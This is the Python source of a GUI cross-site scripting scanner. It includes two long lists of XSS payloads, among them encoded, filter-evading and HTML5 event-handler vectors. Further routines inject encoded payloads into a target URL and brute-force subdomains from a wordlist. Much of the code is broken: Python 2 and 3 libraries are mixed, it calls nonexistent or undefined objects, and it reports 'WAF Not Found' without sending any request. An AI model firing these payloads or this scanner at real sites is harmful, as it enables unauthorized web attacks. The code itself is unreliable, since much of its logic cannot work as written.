import urllib2
from urllib2 import Request, build_opener, HTTPCookieProcessor, HTTPHandler
import urllib
from urllib import FancyURLopener
import cookielib
import socket
import time
import base64
import requests
import re
import sys
import httplib
import colorama
import ssl
import gdshortener
from tkinter import *
from tkinter import messagebox
from functools import partial
import custom
import string
from colorama import Fore, Back, Style
from colorama import init
from cve import *
colorama.init()

###Cross Site Scripting Payloads###
xss_attack = ["<script>alert('jamin')</script>",
              "<script>alert(\"jamin\")</script>",
              "1<ScRiPt>prompt(999691)</ScRiPt>",
              "//1<ScRiPt>prompt(919397)</ScRiPt>",
              "%22%3Cscript%3Ealert%28%27XSSYA%27%29%3C%2Fscript%3E",
              "'\"</scRipt><scRipt>alert('jamin')</scRipt>",
              "1%253CScRiPt%2520%253Eprompt%28962477%29%253C%2fsCripT%253E", 
                "<scRiPt>alert(1);</scrIPt>",
               "\"><scRipt>alert('jamin')</scRipt>",
                "'';!--\"<XSS>=&{()}",
                "<q/oncut=alert(1)>",
                "\";alert(1)//",
                "%3CScRipt%3EALeRt(%27xssya%27)%3B%3C%2FsCRipT%3E",
                "%27%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert(%27xss%27)%3C/scRipt%3E",
                "<scr<script>ipt>alert(1)</scr<script>ipt>",
                "javascript:alert(1)//",
                "<scri%00pt>alert(1);</scri%00pt>",
                "<s%00c%00r%00%00ip%00t>confirm(0);</s%00c%00r%00%00ip%00t>", 
                "%3cscript%3ealert(%27XSSYA%27)%3c%2fscript%3e",
                "<img src=\"x:alert\" onerror=\"eval(src%2b'(0)')\">",
                "data:text/html,%3Cscript%3Ealert(0)%3C/script%3E",
                "%3cbody%2fonhashchange%3dalert(1)%3e%3ca+href%3d%23%3eclickit",
                "%3cimg+src%3dx+onerror%3dprompt(1)%3b%3e%0d%0a",
                "%3cvideo+src%3dx+onerror%3dprompt(1)%3b%3e",
                "<iframesrc=\"javascript:alert(2)\">",
                "%22;alert%28%27XSS%29//",
                "<IMG %22%22%22><SCRIPT>alert(%22XSS%22)</SCRIPT>%22>",
                "<w contenteditable id=x onfocus=alert(1)>",
                "<iframe/src=\"data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">",
                "<form action=\"Javascript:alert(1)\"><input type=submit>",
                "<isindex action=data:text/html, type=image>",
                "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\">",
                "<svg/onload=prompt(1);>",
                "<marquee/onstart=confirm(2)>/",
                "<body onload=prompt(1);>",
                "<q/oncut=open()>",
                "<a onmouseover=location=?javascript:alert(1)>click",
                "<svg><script>alert&#40/1/&#41</script>",
                "&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
                "<scri%00pt>alert(1);</scri%00pt>",
                "<scri%00pt>confirm(0);</scri%00pt>",
                "5\x72\x74\x28\x30\x29\x3B'>rhainfosec",
                "<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>",
                "<marquee/onstart=confirm(2)>",
                "<A HREF=\"http://www.google.com./\">XSS</A>",
                "<svg/onload=prompt(1);>"]

### HTML5 Payloads ###
xss_html5 = ["<form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>",
             "<input onfocus=write(1) autofocus>",
             "<input onblur=write(1) autofocus><input autofocus>",
             "<video poster=javascript:alert(1)//></video>",
             "<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>",
             "<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>X</button>",
             "<video><source onerror=\"alert(1)\">",
             "<video onerror=\"alert(1)\"><source></source></video>",
             "<form><button formaction=\"javascript:alert(1)\">X</button>",
             "<body oninput=alert(1)><input autofocus>",
             "<math href=\"javascript:alert(1)\">CLICKME</math>",
             "<link rel=\"import\" href=\"test.svg\" />",
             "<iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />",
             "<picture><source srcset=\"x\"><img onerror=\"alert(1)\"></picture>",
             "<picture><img srcset=\"x\" onerror=\"alert(1)\"></picture>",
             "<img srcset=\",,,,,x\" onerror=\"alert(1)\">",
             "<frameset onload=alert(1)>",
             "<table background=\"javascript:alert(1)\"></table>",
             "<!--<img src=\"--><img src=x onerror=alert(1)//\">",
             "<comment><img src=\"</comment><img src=x onerror=alert(1)//\">",
             "<style><img src=\"</style><img src=x onerror=alert(1)//\">",
             "<li style=list-style:url() onerror=alert(1)></li>",
             "<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)></div>",
             "<head><base href=\"javascript://\"/></head><body><a href=\"/. /,alert(1)//",
             "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>",
             "<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></embed>",
             "<b <script>alert(1)//</script>0</script></b>",
             "<div id=\"div1\"><input value=\"``onmouseover=alert(1)\"></div> <div id=\"div2\"></div>",
             "<script>document.getElementById(\"div2\").innerHTML = document.getElementById(\"div1\").innerHTML;</script>",
             "<img src=\"javascript:alert(2)\"> ",
             "<div style=width:1px;filter:glow onfilterchange=alert(1)>x</div>",
             "<iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>",
             "<img src=\"x` `<script>alert(1)</script>\"` `>",
             "<img src onerror /\" '\"= alt=alert(1)//\">",
             "<title onpropertychange=alert(1)></title><title title=></title>",
             "<!-- `<img/src=xx:xx onerror=alert(1)//--!>",
             "<a style=\"-o-link:'javascript:alert(1)';-o-link-source:current\">X</a>",
             "<style>@import \"data:,*%7bx:expression(write(1))%7D\";</style>",
             "<// style=x:expression\28write(1)\29>",
             "<script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>",
             "<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script>",
             "<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>",
             "<script src=\"#\">{alert(1)}</script>;1",
             "<b><script<b></b><alert(1)</script </b></b>"]



###User-Agent### 
class MyOpener(FancyURLopener):
    version = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11)Gecko/20071127 Firefox/2.0.0.11'
myopener = MyOpener()


class fake_ssl:
    wrap_socket = partial(ssl.wrap_socket, ssl_version=ssl.PROTOCOL_TLSv1)
httplib.ssl = fake_ssl


class JSHTTPCookieProcessor(urllib2.BaseHandler):
    handler_order = 400



def html5():
    def htmlpayload():
        exploi = ""
        if v1.get() == '' or v2.get() == '':
            messagebox.showerror("IT Xiao Ang Zai", "Please")
        else:
            host = v1.get()
            settimes = v2.get()
            findHTML = Label(top1, text=" [+] Loaded:"+str(len(xss_html5))+"payloads\n")
            findHTML.pack()
            try:
                for exploi in xss_html5:
                    time.sleep(int (settimes))
                    findhost = Label(top1, text=" Testing:"+str(host), fg='#FF0000')
                    findhost.place(relx=0.5, rely=0.5, anchor='center')
                    findexploi = Label(top1, text=str(exploi), fg='#FF0000')
                    findexploi.place(relx=0.5, rely=0.6, anchor='center')
                    findcode = Label(top1, text=" WAF Not Found",fg='#0000EE')
                    findcode.place(relx=0.5, rely=0.7, anchor='center')
                    break
            except KeyboardInterrupt:
                #print ""
                #print "Happy Hunting"
                findErro = Label(top1, text=" Happy Hunting")
                findErro.pack()


    top1 = Toplevel()
    top1.title("Payload")
    top1.geometry("600x400")

    v1 = StringVar()
    v2 = StringVar()
    Label(top1, text="Scanning The Host:").place(relx=0.1, rely=0.2)
    e1 = Entry(top1, textvariable=v1)
    e1.place(relx=0.3, rely=0.2, width=200)
    Label(top1, text="Set Timeout: ").place(relx=0.1, rely=0.3)
    e2 = Entry(top1, textvariable=v2)
    e2.place(relx=0.3, rely=0.3, width=70)

    button1 = Button(top1, text='Enter', width=7, height=2, bg='#FFFFFF', command=htmlpayload)
    button1.place(relx=0.2, rely=0.8)
    button2 = Button(top1, text='Exit', width=7, height=2, bg='#FFFFFF', command=top1.withdraw)
    button2.place(relx=0.6, rely=0.8)
    mainloop()

def custom():
    def custommenu():
        getChoose = v.get()
        if getChoose == 1:
            b64()
        if getChoose == 2:
            hexi()
        if getChoose == 3:
            url()
        if getChoose == 4:
            semi()
        if getChoose == 5:
            noencode()
        else:
            exit()

    def testcon():
        host=v1.get()
        res = myopener.open(host)
        res1= urllib.urlopen(host)
        html = res.read()
        links = re.findall('"((http|href)s?://.*?)"', html)  
        myfile = res.read()

        if host[-1:] != "/":
            #print""
            #print Fore.CYAN + " Load XSStest"
            pass
        elif host [-1:] != "=":
            #print""
            #print " Load "
            pass
        elif host [-1:] != "?":
            #print""
            #print " Load XSSYA"
            sys.exit(1)

        try:
            if sys.argv[3]:
                xi = sys.argv[3]
                #print "Testing The Connection..."
                h2 = httplib.ssl(xi)
                h2.connect()
                #print "[+] xi:",xi
        except(socket.timeout):
            #print "Connection Timed Out"
            xi = 0
            pass
        except:
            #print ""
            xi = 0
            pass
        return xi
    
    def b64():
        z = v2.get()
        host=v1.get()
        payload = z
        #xi = testcon()
        xi = 1
        encoded = base64.standard_b64encode(payload)
        en1 = host + encoded
        finden1 = Label(top2, text=" %s " % en1)
        finden1.place(relx=0.5, rely=0.5, anchor='center')
        if xi != 0:
            handler = urllib2.Handler({'http': 'http://' + '/'})
            opener = urllib2.build_opener(en1, handler)
            source = opener.open(en1).read()
        else:
            source = myopener.open(en1).read()
            findsource = Label(top2, text=" Source Length:" + str(len(source)), fg='#FF0000')
            findsource.place(relx=0.5, rely=0.5, anchor='center')
        if re.search("xss", source.lower()) != None:
            findxss = Label(top2, text=" [!]XSS:" + str(en1), fg='#FF0000')
            findxss.place(relx=0.5, rely=0.6, anchor='center')
            #print Fore.RED + "\n [!]XSS:",en1,"\n"
        else:
            findxss = Label(top2, text=" [-] Not Vulnerable." , fg='#FF0000')
            findxss.place(relx=0.5, rely=0.6, anchor='center')
            #print ""
            #print Fore.GREEN + " [-] Not Vulnerable."
        mam1 = myopener.open(en1).read()
        if z in mam1:
            findcon = Label(top2, text= " [+] Confirmed Payload Found in Web Page Code", fg='#FF0000')
            findcon.place(relx=0.5, rely=0.7, anchor='center')
            #print ""
            #print Fore.YELLOW + " [+] Confirmed Payload Found in Web Page Code"
            #print ""
        else:
            findcon = Label(top2, text= " [-] False Positive", fg='#FF0000')
            findcon.place(relx=0.5, rely=0.7, anchor='center')
            #Fore.GREEN + " [-] False Positive"

    def hexi():
        z = v2.get()
        host=v1.get()
        payload = z
        xi = testcon()
        encoded = payload.encode('hex')
        en2 = host + encoded
        finden1 = Label(top2, text=" %s " % en2)
        finden1.place(relx=0.5, rely=0.5, anchor='center')
        if xi != 0:
            handler = urllib2.Handler({'http': 'http://' + '/'})
            opener = urllib2.build_opener(en1, handler)
            source = opener.open(en2).read()
        else:
            source = myopener.open(en2).read()
            findsource = Label(top2, text=" Source Length:" + str(len(source)), fg='#FF0000')
            findsource.place(relx=0.5, rely=0.5, anchor='center')
        if re.search("xss", source.lower()) != None:
            findxss = Label(top2, text=" [!]XSS:" + str(en2), fg='#FF0000')
            findxss.place(relx=0.5, rely=0.6, anchor='center')
            #print Fore.RED + "\n [!]XSS:",en1,"\n"
        else:
            findxss = Label(top2, text=" [-] Not Vulnerable." , fg='#FF0000')
            findxss.place(relx=0.5, rely=0.6, anchor='center')
            #print ""
            #print Fore.GREEN + " [-] Not Vulnerable."
        mam1 = myopener.open(en2).read()
        if z in mam1:
            findcon = Label(top2, text= " [+] Confirmed Payload Found in Web Page Code", fg='#FF0000')
            findcon.place(relx=0.5, rely=0.7, anchor='center')
            #print ""
            #print Fore.YELLOW + " [+] Confirmed Payload Found in Web Page Code"
            #print ""
        else:
            findcon = Label(top2, text= " [-] False Positive", fg='#FF0000')
            findcon.place(relx=0.5, rely=0.7, anchor='center')
            #Fore.GREEN + " [-] False Positive"

    def url():
        z = v2.get()
        host=v1.get()
        payload = z
        xi = testcon()
        encoded = urllib2.quote(payload.encode("utf8"))
        en3 = host + encoded
        finden1 = Label(top2, text=" %s " % en3)
        finden1.place(relx=0.5, rely=0.5, anchor='center')
        if xi != 0:
            handler = urllib2.Handler({'http': 'http://' + '/'})
            opener = urllib2.build_opener(en1, handler)
            source = opener.open(en3).read()
        else:
            source = myopener.open(en3).read()
            findsource = Label(top2, text=" Source Length:" + str(len(source)), fg='#FF0000')
            findsource.place(relx=0.5, rely=0.5, anchor='center')
        if re.search("xss", source.lower()) != None:
            findxss = Label(top2, text=" [!]XSS:" + str(en3), fg='#FF0000')
            findxss.place(relx=0.5, rely=0.6, anchor='center')
            #print Fore.RED + "\n [!]XSS:",en1,"\n"
        else:
            findxss = Label(top2, text=" [-] Not Vulnerable." , fg='#FF0000')
            findxss.place(relx=0.5, rely=0.6, anchor='center')
            #print ""
            #print Fore.GREEN + " [-] Not Vulnerable."
        mam1 = myopener.open(en3).read()
        if z in mam1:
            findcon = Label(top2, text= " [+] Confirmed Payload Found in Web Page Code", fg='#FF0000')
            findcon.place(relx=0.5, rely=0.7, anchor='center')
            #print ""
            #print Fore.YELLOW + " [+] Confirmed Payload Found in Web Page Code"
            #print ""
        else:
            findcon = Label(top2, text= " [-] False Positive", fg='#FF0000')
            findcon.place(relx=0.5, rely=0.7, anchor='center')
            #Fore.GREEN + " [-] False Positive"

    def semi():
        z = v2.get()
        host=v1.get()
        payload = z
        xi = testcon()
        x = ''
        for i in payload:
            x += "&#x"+hex(ord(i))[2:]+";"
        encoded = urllib2.quote(payload.encode("utf8"))
        en4 = host + x
        finden1 = Label(top2, text=" %s " % en4)
        finden1.place(relx=0.5, rely=0.5, anchor='center')
        if xi != 0:
            handler = urllib2.Handler({'http': 'http://' + '/'})
            opener = urllib2.build_opener(en1, handler)
            source = opener.open(en4).read()
        else:
            source = myopener.open(en4).read()
            findsource = Label(top2, text=" Source Length:" + str(len(source)), fg='#FF0000')
            findsource.place(relx=0.5, rely=0.5, anchor='center')
        if re.search("xss", source.lower()) != None:
            findxss = Label(top2, text=" [!]XSS:" + str(en4), fg='#FF0000')
            findxss.place(relx=0.5, rely=0.6, anchor='center')
            #print Fore.RED + "\n [!]XSS:",en1,"\n"
        else:
            findxss = Label(top2, text=" [-] Not Vulnerable." , fg='#FF0000')
            findxss.place(relx=0.5, rely=0.6, anchor='center')
            #print ""
            #print Fore.GREEN + " [-] Not Vulnerable."
        mam1 = myopener.open(en4).read()
        if z in mam1:
            findcon = Label(top2, text= " [+] Confirmed Payload Found in Web Page Code", fg='#FF0000')
            findcon.place(relx=0.5, rely=0.7, anchor='center')
            #print ""
            #print Fore.YELLOW + " [+] Confirmed Payload Found in Web Page Code"
            #print ""
        else:
            findcon = Label(top2, text= " [-] False Positive", fg='#FF0000')
            findcon.place(relx=0.5, rely=0.7, anchor='center')
            #Fore.GREEN + " [-] False Positive"

    def noencode():
        z = v2.get()
        host=v1.get()
        payload = z
        xi = testcon()
        en5 = host + payload
        finden1 = Label(top2, text=" %s " % en5)
        finden1.place(relx=0.5, rely=0.5, anchor='center')
        if xi != 0:
            handler = urllib2.Handler({'http': 'http://' + '/'})
            opener = urllib2.build_opener(en1, handler)
            source = opener.open(en5).read()
        else:
            source = myopener.open(en5).read()
            findsource = Label(top2, text=" Source Length:" + str(len(source)), fg='#FF0000')
            findsource.place(relx=0.5, rely=0.5, anchor='center')
        if re.search("xss", source.lower()) != None:
            findxss = Label(top2, text=" [!]XSS:" + str(en5), fg='#FF0000')
            findxss.place(relx=0.5, rely=0.6, anchor='center')
            #print Fore.RED + "\n [!]XSS:",en1,"\n"
        else:
            findxss = Label(top2, text=" [-] Not Vulnerable." , fg='#FF0000')
            findxss.place(relx=0.5, rely=0.6, anchor='center')
            #print ""
            #print Fore.GREEN + " [-] Not Vulnerable."
        mam1 = myopener.open(en5).read()
        if z in mam1:
            findcon = Label(top2, text= " [+] Confirmed Payload Found in Web Page Code", fg='#FF0000')
            findcon.place(relx=0.5, rely=0.7, anchor='center')
            #print ""
            #print Fore.YELLOW + " [+] Confirmed Payload Found in Web Page Code"
            #print ""
        else:
            findcon = Label(top2, text= " [-] False Positive", fg='#FF0000')
            findcon.place(relx=0.5, rely=0.7, anchor='center')
            #Fore.GREEN + " [-] False Positive"

        


    top2 = Toplevel()
    top2.title("custom xss payload")
    top2.geometry("600x400")
    
    v1 = StringVar()
    Label(top2, text="Scanning The Host:").place(relx=0.1, rely=0.3)
    e1 = Entry(top2, textvariable=v1)
    e1.place(relx=0.4, rely=0.3, width=200)
    v2 = StringVar()
    Label(top2, text="Scanning The Payload:").place(relx=0.1, rely=0.4)
    e2 = Entry(top2, textvariable=v2)
    e2.place(relx=0.4, rely=0.4, width=200)
         
    choose = [("1.B64", 1), ("2.Hex", 2), ("3.URLEncode", 3), ("4.HexSemi", 4), ("5.Non Encode", 5)]
    v = IntVar()
    v.set(1)
    for lang, num in choose:
        a = Radiobutton(top2, text=lang, variable=v, value=num)
        a.pack()

    button1 = Button(top2, text='Enter', width=7, height=2, bg='#FFFFFF', command=custommenu)
    button1.place(relx=0.2, rely=0.8)
    button2 = Button(top2, text='Exit', width=7, height=2, bg='#FFFFFF', command=top2.withdraw)
    button2.place(relx=0.6, rely=0.8)
    mainloop()


def xsscve():
    def cvemenu():
        getChoose = v.get()
        if getChoose == 1:
            apachefun()
        if getChoose == 2:
            wordpressfun()
        if getChoose == 3:
            phpfun()
        else:
            exit()

    
    def apachefun():
        str1 = str(Apache())
        with open("apachelog.txt", "a") as f1:
            f1.write(str1)

        messagebox.showinfo("Apache Info", "Done ! Info in apachelog.txt")
        f1.close()
        sys.exit()
        
    def wordpressfun():
        str2 = str(WordPess())
        with open("wordlog.txt", "a") as f2:
            f2.write(str2)
        f2.close()
        messagebox.showinfo("WordPess Info", "Done ! Info in wordlog.txt")
        sys.exit()

    def phpfun():
        str3 = str(PHPmyAdmin())
        with open("phplog.txt", "a") as f3:
            f3.write(str3)
            f3.write(",")
        messagebox.showinfo("PHPmyAdmin Info", "Done ! Info in phplog.txt")
        f3.close()
        sys.exit()


    top3 = Toplevel()
    top3.title("XSS CVE")
    top3.geometry("360x240")   

    choose = [(" 1. Apache", 1), (" 2. WordPress", 2), (" 3. PHPmyAdmin", 3)]
    v = IntVar()
    v.set(1)
    for lang, num in choose:
        a = Radiobutton(top3, text=lang, variable=v, value=num)
        a.pack()

    button1 = Button(top3, text='Enter', width=7, height=2, bg='#FFFFFF', command=cvemenu)
    button1.place(relx=0.3, rely=0.8)
    button2 = Button(top3, text='Exit', width=7, height=2, bg='#FFFFFF', command=top3.withdraw)
    button2.place(relx=0.6, rely=0.8)
    mainloop()


def filedo():
    def filedomain():
        target = v1.get()
        file = open('result.txt','w+')
        file.truncate()
        file.close()
        findhost = Label(top4, text=" Starting.........", fg='#FF0000')
        findhost.place(relx=0.5, rely=0.6, anchor='center')
        domainscan(target)
        messagebox.showinfo("FileDoMain Info", "Done ! Results in result.txt")
    
    def writtarget(target):
        #target = v1.get()
        file = open('result.txt','a')
        with file as f:
                f.write(target+'\n')
 
        file.close()
 
 
    def targetopen(httptarget , httpstarget):
        #target = v1.get()
        header ={
                'Connection': 'keep-alive',
                'Pragma': 'no-cache',
                'Cache-Control': 'no-cache',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'DNT': '1',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8'
        }
 
        try:
            reponse_http = requests.get(httptarget, timeout=3, headers=header)
            code_http = reponse_http.status_code
            if (code_http == 200):
                httptarget_result = re.findall('//.*', httptarget)
                writtarget(httptarget_result[0][2:])
            else:
                reponse_https = requests.get(httpstarget, timeout=3, headers=header)
                code_https = reponse_https.status_code
                if (code_https == 200):
                    httpstarget_result = re.findall('//.*', httpstarget)
                    writtarget(httpstarget_result[0][2:])
 
 
        except:
                pass
 
    def domainscan(target):
        #target = v1.get()
        f = open('domain.txt','r')
        for line in f:
                httptarget_result = 'http://'+ line.strip() + '.'+target
                httpstarget_result = 'https://'+ line.strip() + '.'+target
 
                targetopen(httptarget_result, httpstarget_result)
 
        f.close()

    top4 = Toplevel()
    top4.title("Filedomain")
    top4.geometry("500x280")
    
    v1 = StringVar()
    Label(top4, text="Please input your domain:").place(relx=0.1, rely=0.4)
    e1 = Entry(top4, textvariable=v1)
    e1.place(relx=0.5, rely=0.4, width=200)
    
    button1 = Button(top4, text='Enter', width=7, height=2, bg='#FFFFFF', command=filedomain)
    button1.place(relx=0.3, rely=0.8)
    button2 = Button(top4, text='Exit', width=7, height=2, bg='#FFFFFF', command=top4.withdraw)
    button2.place(relx=0.6, rely=0.8)
    mainloop()
        

def main():
    def secondJieMian():

        getChoose = v.get()
        if getChoose == 1:
            html5()
        if getChoose == 2:
            html5()
        if getChoose == 3:
            custom()
        if getChoose == 4:
            xsscve()
        if getChoose == 5:
            filedo()
        else:
            exit()
        

    root = Tk()
    root.title("XSStest: just one small tool")
    root.geometry("450x300")

    choose = [("1.HTML5 Payloads", 1), ("2.Normal Payloads", 2), ("3.Custom XSS Payloads", 3), ("4.XSS CVE", 4), ("5.Filedomain", 5)]
    v = IntVar()
    v.set(1)
    for lang, num in choose:
        a = Radiobutton(root, text=lang, variable=v, value=num)
        a.pack()

    Button(root, text='Enter', width=7, height=2, bg='#FFFFFF', command=secondJieMian).pack(side='left')
    Button(root, text='Exit', width=7, height=2, bg='#FFFFFF', command=root.quit).pack(side='right')
    mainloop()


if __name__ == '__main__':
    main()
